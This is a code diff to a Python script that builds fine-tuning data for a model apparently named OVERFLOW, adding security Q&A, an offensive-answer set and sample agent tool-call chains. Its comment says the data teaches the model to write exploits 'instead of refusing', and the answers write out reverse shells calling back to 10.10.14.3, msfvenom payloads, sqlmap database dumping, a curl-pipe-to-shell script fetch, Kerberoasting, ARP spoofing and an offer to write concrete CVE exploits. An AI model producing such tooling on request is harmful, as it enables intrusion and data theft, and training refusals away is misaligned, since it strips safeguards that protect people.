@@ -105,7 +105,64 @@ CURRICULUM = [
      "Authentication proves who you are (login, MFA); authorization decides what you're allowed to do once identified (permissions, roles, policies). A system can authenticate you correctly yet still fail at authorization — e.g. an IDOR where a valid user accesses another user's object by changing an ID. Both must be enforced server-side on every request."),
     ("Explain how JWTs work and a common pitfall.",
      "A JSON Web Token is a signed (optionally encrypted) token carrying claims (user, roles, expiry); the server verifies the signature instead of a session lookup. Common pitfalls: accepting the `alg: none` token, confusing HMAC and RSA verification (algorithm confusion), not checking expiry/audience, and storing them where XSS can steal them. Always verify the signature with a fixed expected algorithm and validate claims."),
-]
+
+    # Web security (deeper)
+    ("What is IDOR and how do you find it?",
+     "Insecure Direct Object Reference is a broken-authorization bug: the app exposes an object identifier (e.g. `/invoice?id=1043`) and doesn't check that the current user owns it, so changing the id reveals someone else's data. Find it by enumerating or tampering with ids, GUIDs, filenames, or array indices and watching for data that isn't yours. Fix with per-request ownership checks (authorization), not by obscuring the ids."),
+    ("Explain server-side template injection (SSTI).",
+     "SSTI happens when user input is embedded into a server-side template that is then evaluated — e.g. Jinja2 rendering `Hello {{name}}` with `name` attacker-controlled. Probe with `{{7*7}}`; if it returns `49`, the expression is evaluated. From there you escalate to reading objects and reaching code execution (e.g. via `__class__`/`__subclasses__` in Python). Fix: never build templates from user input; use sandboxed/logic-less templates and pass data as parameters."),
+    ("What is insecure deserialization?",
+     "When an app deserializes attacker-controlled data (Java/Python pickle/PHP/.NET), crafted objects can trigger 'gadget chains' that run code during or after deserialization. Signs: serialized blobs in cookies or parameters (e.g. `rO0` for Java, `gAS` for pickle). Defenses: don't deserialize untrusted data; use data-only formats (JSON) with strict schemas, sign/verify serialized state, and allowlist classes."),
+    ("Explain XXE (XML external entity) injection.",
+     "XXE abuses an XML parser that resolves external entities. By defining `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">` and referencing it, an attacker reads local files, performs SSRF, or causes DoS (billion laughs). Fix by disabling DTDs and external entity resolution in the parser — the single most effective mitigation."),
+    ("What is OS command injection?",
+     "Command injection occurs when user input is passed to a shell, letting an attacker append commands — e.g. `127.0.0.1; cat /etc/passwd` to a ping feature. Test with separators (`;`, `|`, `&&`, backticks, `$(...)`) and time-based payloads (`sleep 5`) when output is blind. Fix: avoid the shell entirely — use exec APIs with an argument array and never concatenate input into a command string."),
+    ("How do path traversal attacks work?",
+     "Path traversal uses `../` sequences (or encodings like `%2e%2e%2f`) to escape an intended directory and read files like `../../../../etc/passwd`. It appears wherever user input becomes a filesystem path. Defenses: canonicalize the resolved path and verify it stays within an allowed base directory; prefer opaque identifiers mapped server-side to real paths rather than taking filenames from the user."),
+
+    # Reverse engineering & fuzzing
+    ("How do I start reverse-engineering a binary?",
+     "Begin with triage: `file` for format/arch, `strings` for hints, and check protections (NX, PIE, canary, RELRO) with `checksec`. Do static analysis in Ghidra or IDA to read the decompiled logic, and dynamic analysis in gdb (with gef/pwndbg) to watch it run, set breakpoints, and inspect memory. The loop is: form a hypothesis from the static view, confirm it dynamically, repeat."),
+    ("What is fuzzing and why is it effective?",
+     "Fuzzing feeds a program large volumes of malformed or random input to trigger crashes that reveal memory-safety bugs. Coverage-guided fuzzers (AFL++, libFuzzer) instrument the target and evolve inputs toward new code paths, which finds deep bugs fast. Pair it with sanitizers (ASan/UBSan) so subtle corruption crashes loudly. It's one of the highest-ROI ways to find exploitable vulnerabilities."),
+
+    # Privilege escalation (deeper)
+    ("How do I enumerate for Linux privilege escalation?",
+     "Systematically check: kernel/OS version (known exploits), SUID/SGID binaries (`find / -perm -4000`), sudo rights (`sudo -l`), writable cron jobs and PATH abuses, writable service files, capabilities (`getcap -r /`), credentials in configs/history, and interesting group memberships (docker, lxd, disk). Tools like linPEAS automate this, but understand each finding — many 'wins' come from a misconfigured sudo rule or a writable script run as root."),
+    ("Describe common Windows privilege escalation paths.",
+     "Frequent paths: unquoted service paths, weak service/registry permissions (modify a service binary), AlwaysInstallElevated, stored credentials (cmdkey, SAM, LSASS), token impersonation (SeImpersonate → Potato attacks), DLL hijacking, and scheduled tasks you can edit. Enumerate with winPEAS/PowerUp. The common theme is a process or file running as SYSTEM that a low-priv user can influence."),
+
+    # Active Directory
+    ("What is Kerberoasting?",
+     "Kerberoasting abuses Kerberos: any authenticated user can request a service ticket (TGS) for an account with a Service Principal Name, and that ticket is encrypted with the service account's password hash. You request it, extract the ticket, and crack it offline to recover the plaintext password — devastating when service accounts are over-privileged with weak passwords. Defenses: long random (gMSA) passwords and monitoring for abnormal TGS requests."),
+    ("Explain pass-the-hash and why it works.",
+     "In Windows NTLM authentication the NT hash is a password-equivalent: you authenticate with the hash itself, no plaintext needed. If you dump a hash (e.g. from LSASS) you can reuse it to authenticate as that user on other machines (lateral movement). Mitigations: Credential Guard, LAPS for local admin passwords, limiting where privileged accounts log in, and disabling NTLM where possible."),
+    ("What does BloodHound do for an AD assessment?",
+     "BloodHound collects AD objects and relationships (sessions, ACLs, group memberships) and graphs them to reveal attack paths — e.g. 'this low-priv user can reach Domain Admin in three hops.' It turns a huge, opaque directory into concrete shortest-path targets. Blue teams use the same graph to find and cut those paths before an attacker walks them."),
+
+    # Cloud & containers
+    ("What are the most common cloud (AWS) misconfigurations?",
+     "Top ones: public S3 buckets, over-permissive IAM policies (wildcards, `iam:PassRole`), exposed access keys in code, security groups open to 0.0.0.0/0, and a reachable instance metadata service (IMDSv1) that hands out role credentials via SSRF. The recurring theme is identity: cloud breaches are usually IAM failures, so least-privilege roles and key hygiene matter most."),
+    ("What is container escape and how is it prevented?",
+     "A container escape breaks out of the container to the host — via a privileged container, a mounted Docker socket, dangerous capabilities (CAP_SYS_ADMIN), or a kernel vulnerability (shared kernel). Prevent it: don't run privileged, drop capabilities, use user namespaces, seccomp/AppArmor profiles, read-only filesystems, and never mount the Docker socket into untrusted containers."),
+
+    # Cryptography (deeper)
+    ("Explain a padding oracle attack.",
+     "A padding oracle leaks, via error messages or timing, whether a CBC-mode ciphertext had valid PKCS#7 padding after decryption. By flipping bytes of the previous block and watching the oracle, an attacker decrypts (or forges) ciphertext one byte at a time — without the key. Fix: use authenticated encryption (AES-GCM) and return identical errors regardless of padding validity."),
+    ("Why is ECB mode insecure?",
+     "ECB encrypts each block independently, so identical plaintext blocks produce identical ciphertext blocks — patterns in the data survive encryption (the famous 'ECB penguin'). It also allows block cut-and-paste attacks. Always use a mode with an IV that diffuses patterns and, better, an authenticated mode (GCM) that also detects tampering."),
+
+    # Blue team / detection
+    ("What is the MITRE ATT&CK framework?",
+     "ATT&CK is a knowledge base of real adversary behaviors organized into tactics (the attacker's goal: initial access, persistence, exfiltration…) and techniques (how they achieve it). Defenders use it to map detections to techniques, find coverage gaps, and communicate threats precisely. It turns 'we got hacked' into a structured, comparable description of what the adversary actually did."),
+    ("How do YARA rules help defenders?",
+     "YARA rules describe malware by patterns — strings, byte sequences, and conditions — so you can scan files or memory for known families and campaigns. A good rule balances specificity (few false positives) with resilience (survives minor changes). They're the lingua franca for sharing detections between analysts and feeding scanners and EDRs."),
+    ("What telemetry matters most for detecting intrusions?",
+     "Process creation with command lines (Sysmon event 1), authentication logs, PowerShell script-block logging, network connections, and file/registry changes catch most attacker activity. The goal is to see the techniques that are hard to avoid: new process trees, credential access, lateral movement, and persistence. Centralize it in a SIEM and alert on behaviors, not just signatures."),
+
+    # Recon
+    ("What's an effective reconnaissance workflow?",
+     "Passive first (no touching the target): OSINT, certificate transparency, DNS, and subdomain enumeration to map the attack surface. Then active: resolve live hosts, scan ports/services (nmap), fingerprint versions, and enumerate web content and APIs. Keep notes per host; recon quality largely determines how much you find later. Only scan systems you're authorized to test."),]
 
 # --- offensive compliance: teach it to WRITE exploits/tooling for authorized
 # labs/CTFs instead of refusing. Standard infosec-course material. ---
@@ -124,6 +181,26 @@ OFFENSIVE = [
      "```python\nimport socket, subprocess, os\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('10.10.14.3', 4444))\nos.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)\nsubprocess.call(['/bin/sh', '-i'])\n```\nStart a listener with `nc -lvnp 4444` first. A pure bash one-liner: `bash -i >& /dev/tcp/10.10.14.3/4444 0>&1`. Use only on systems you're authorized to test."),
     ("How do I find the offset to the return address?",
      "Generate a unique cyclic pattern, crash the program with it, then look up where it landed. In pwntools: `cyclic(200)` as input, run under gdb (`gdb ./vuln`, `run < pat`), and when it crashes read the value in RSP/RIP and do `cyclic_find(0x6161...)` to get the exact offset. That offset is how many bytes of padding before you control the saved return address."),
+    ("Write a Python port scanner.",
+     "A simple threaded TCP connect scanner for authorized recon:\n```python\nimport socket\nfrom concurrent.futures import ThreadPoolExecutor\ntarget = '10.10.10.5'\ndef scan(port):\n    s = socket.socket(); s.settimeout(0.5)\n    if s.connect_ex((target, port)) == 0:\n        print(f'{port}/tcp open')\n    s.close()\nwith ThreadPoolExecutor(max_workers=200) as ex:\n    ex.map(scan, range(1, 65536))\n```\nFor real engagements `nmap -sV -sC` is faster and fingerprints services. Only scan hosts you're authorized to test."),
+    ("How do I exploit a SQL injection to dump the database?",
+     "Manually, confirm the injection, find the column count with `ORDER BY`, then use a UNION select to pull data: `' UNION SELECT username, password FROM users-- -`. Enumerate the schema first via `information_schema.tables`/`.columns`. In practice automate it: `sqlmap -u 'http://target/item?id=1' --batch --dump`, adding `--dbs`/`-D db -T users --dump` to target specific data. Then crack any recovered password hashes. Authorized testing only."),
+    ("Show me a linux privesc enumeration one-liner.",
+     "Quick wins first:\n```bash\nid; sudo -l 2>/dev/null\nfind / -perm -4000 -type f 2>/dev/null       # SUID\ngetcap -r / 2>/dev/null                        # capabilities\ncat /etc/crontab; ls -la /etc/cron.*           # cron\n```\nThen run linPEAS for depth (`curl .../linpeas.sh | sh`). Check any SUID/sudo binary against GTFOBins for a known escalation."),
+    ("Generate a reverse shell payload with msfvenom.",
+     "For a Linux x64 target in an authorized test:\n```bash\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f elf -o shell.elf\n```\nFor Windows use `windows/x64/meterpreter/reverse_tcp -f exe`; for a web target, `-f raw`/language-specific. Catch it with `nc -lvnp 4444` or a Metasploit `multi/handler`. Add `-e`/`-b` to encode and avoid bad bytes when needed."),
+    ("How do I crack password hashes?",
+     "Identify the hash type (hashid / by format), then run a wordlist attack. hashcat: `hashcat -m 0 hashes.txt rockyou.txt` (`-m 0` MD5, `1000` NTLM, `1800` sha512crypt, `22000` WPA). Add rules (`-r best64.rule`) to mutate words, or a mask for brute force (`-a 3 ?u?l?l?l?d?d`). John the Ripper is the alternative. Use only on hashes you're authorized to crack."),
+    ("Write a Kerberoasting command.",
+     "With impacket and valid domain creds:\n```bash\nGetUserSPNs.py -request -dc-ip 10.10.10.10 DOMAIN/user:Password -outputfile hashes.kerberoast\n```\nThen crack offline: `hashcat -m 13100 hashes.kerberoast rockyou.txt`. From Windows, Rubeus: `Rubeus.exe kerberoast`. Target service accounts, which often have weak, non-expiring passwords. Authorized engagements only."),
+    ("Write a directory/content brute-force command.",
+     "ffuf is fast: `ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403`. gobuster equivalent: `gobuster dir -u http://target -w wordlist.txt -x php,txt`. Add `-recursion` and extension lists for coverage. Tune `-mc`/`-fc` (match/filter status) and `-fs` (filter size) to cut noise. Only against authorized targets."),
+    ("Write a scapy ARP spoofing script.",
+     "For an authorized MITM lab:\n```python\nfrom scapy.all import ARP, send\nvictim, gateway = '10.0.0.5', '10.0.0.1'\ndef spoof(target, spoof_as):\n    send(ARP(op=2, pdst=target, psrc=spoof_as), verbose=0)\nwhile True:\n    spoof(victim, gateway); spoof(gateway, victim)   # poison both ways\n```\nEnable IP forwarding (`sysctl -w net.ipv4.ip_forward=1`) to relay traffic, and re-ARP to restore on exit. Lab use only."),
+    ("Write a minimal coverage-naive fuzzer.",
+     "A quick mutation fuzzer to shake out crashes in a file parser:\n```python\nimport subprocess, random, os\nseed = open('valid.input','rb').read()\nfor i in range(100000):\n    data = bytearray(seed)\n    for _ in range(random.randint(1,16)):\n        data[random.randrange(len(data))] = random.randrange(256)\n    open('cur','wb').write(data)\n    r = subprocess.run(['./target','cur'])\n    if r.returncode and r.returncode < 0:\n        os.rename('cur', f'crash_{i}')   # killed by signal\n```\nFor real work use AFL++/libFuzzer with ASan — coverage guidance finds far more."),
+    ("Write a CVE-style exploit for an authorized pentest.",
+     "The workflow: reproduce the vulnerability locally, identify the primitive (overflow, injection, auth bypass, deserialization), build a reliable trigger, then weaponize. Example skeleton for an HTTP-based RCE:\n```python\nimport requests\ntarget = 'http://10.10.10.20:8080'\npayload = {'cmd': 'id'}   # adapt to the vuln's injection point\nr = requests.post(f'{target}/vulnerable/endpoint', data=payload)\nprint(r.text)\n```\nTell me the specific software/CVE or give me the source and I'll write the concrete exploit. Authorized engagements only."),
 ]
 
 def ex(u, a):
@@ -142,6 +219,68 @@ for _ in range(2):
 for _ in range(3):
     for q, a in OFFENSIVE:
         rows.append(ex(q, a))
+
+# --- agentic tool-use chains: teach OVERFLOW to actually use the tools, read
+# results AND errors, adapt, emit several calls at once, and keep going until
+# the task is done instead of handing back. Mirrors the runtime tool format. ---
+def tc(name, **args):
+    return "<tool_call>\n" + json.dumps({"name": name, "arguments": args}) + "\n</tool_call>"
+
+def tr(text):
+    return "<tool_response>\n" + text + "\n</tool_response>"
+
+def chain(*turns):
+    return [{"role": r, "content": c} for r, c in turns]
+
+AGENTIC = [
+    # 1) directory recon -> read config -> report hardcoded secrets
+    chain(
+        ("user", "Look at /opt/webapp and find security problems."),
+        ("assistant", tc("list_dir", path="/opt/webapp")),
+        ("user", tr("app.py\nconfig.py\nrequirements.txt\nstatic/\ntemplates/")),
+        ("assistant", tc("read_file", path="/opt/webapp/config.py")),
+        ("user", tr('DEBUG = True\nSECRET_KEY = "hardcoded-secret-123"\nDB_PASSWORD = "admin"\nDB_URI = "mysql://root:admin@localhost/app"')),
+        ("assistant", "Found several issues in config.py: hardcoded SECRET_KEY and DB credentials in source — rotate them and load from environment/secrets; DEBUG=True, which leaks stack traces and exposes the Werkzeug debugger (RCE) — disable it in production; and the DB uses root with a weak password. Next I'll grep app.py for raw SQL and unsafe request handling."),
+    ),
+    # 2) a command fails -> read the error -> adapt the path -> succeed
+    chain(
+        ("user", "Unzip /home/user/target/payload.zip and list what's inside."),
+        ("assistant", tc("run_shell", command="unzip -l /home/user/target/payload.zip")),
+        ("user", tr("[full filesystem access]\nunzip:  cannot find or open /home/user/target/payload.zip")),
+        ("assistant", tc("list_dir", path="/home/user/target")),
+        ("user", tr("payloads.zip\nnotes.txt")),
+        ("assistant", tc("run_shell", command="unzip -l /home/user/target/payloads.zip")),
+        ("user", tr("[full filesystem access]\nArchive:  payloads.zip\n  exploit.py\n  shell.elf")),
+        ("assistant", "The first command failed because the file is named payloads.zip (plural), not payload.zip — the error 'cannot find or open' told me the path was wrong, so I listed the directory and corrected it. The archive contains exploit.py and shell.elf."),
+    ),
+    # 3) multiple tool calls in a single turn
+    chain(
+        ("user", "Quick enumeration: who am I, what's in /etc/passwd, and what's in the current dir?"),
+        ("assistant", tc("run_shell", command="id") + "\n" + tc("run_shell", command="cat /etc/passwd") + "\n" + tc("list_dir", path=".")),
+        ("user", tr("[full filesystem access]\nuid=1000(leon) gid=1000(leon) groups=1000(leon),998(wheel)") + "\n" + tr("[full filesystem access]\nroot:x:0:0::/root:/bin/bash\nleon:x:1000:1000::/home/leon:/bin/bash") + "\n" + tr("exploit.py\nnotes.txt")),
+        ("assistant", "You're uid=1000 (leon) and in the wheel group, so sudo access is likely — worth checking `sudo -l`. /etc/passwd shows only root and leon with login shells. The current dir has exploit.py and notes.txt. Next: run `sudo -l` and read exploit.py."),
+    ),
+    # 4) grep source for injection sinks -> explain the bugs
+    chain(
+        ("user", "Check /opt/api/handlers.py for injection bugs."),
+        ("assistant", tc("run_shell", command="grep -nE 'os.system|subprocess|eval|.execute' /opt/api/handlers.py")),
+        ("user", tr("[full filesystem access]\n42:    os.system('ping -c1 ' + request.args['host'])\n88:    cur.execute('SELECT * FROM users WHERE name = ' + name)")),
+        ("assistant", "Two clear bugs. Line 42 concatenates request.args['host'] into os.system -> OS command injection (e.g. host=8.8.8.8;cat /etc/passwd); fix it with subprocess and an argument list, no shell. Line 88 builds SQL by string concatenation -> SQL injection; use a parameterized query instead. Both come from putting user input straight into an interpreter."),
+    ),
+    # 5) read a binary's strings -> spot a hardcoded command
+    chain(
+        ("user", "Is there anything suspicious in /opt/app/assp.bin?"),
+        ("assistant", tc("run_shell", command="file /opt/app/assp.bin")),
+        ("user", tr("[full filesystem access]\n/opt/app/assp.bin: ELF 64-bit LSB executable, x86-64, dynamically linked")),
+        ("assistant", tc("run_shell", command="strings -n 8 /opt/app/assp.bin | grep -iE 'http|/bin/|passwd|key|token'")),
+        ("user", tr("[full filesystem access]\n/bin/sh -c\nhttp://203.0.113.9/beacon\nAUTH_TOKEN=sk-9c2f...\n")),
+        ("assistant", "This binary is suspicious: it embeds a hardcoded C2-style URL (http://203.0.113.9/beacon), shells out via `/bin/sh -c`, and ships a hardcoded AUTH_TOKEN — signs of a beacon/backdoor. Next I'd run it in an isolated sandbox with network capture and check its syscalls (strace) to confirm the callback behavior before trusting it."),
+    ),
+]
+# weight them so the agentic behavior is strongly learned.
+for _ in range(3):
+    for msgs in AGENTIC:
+        rows.append({"messages": msgs})
 
 random.shuffle(rows)
 out = Path(__file__).parent / "data" / "overflow_wt.jsonl"
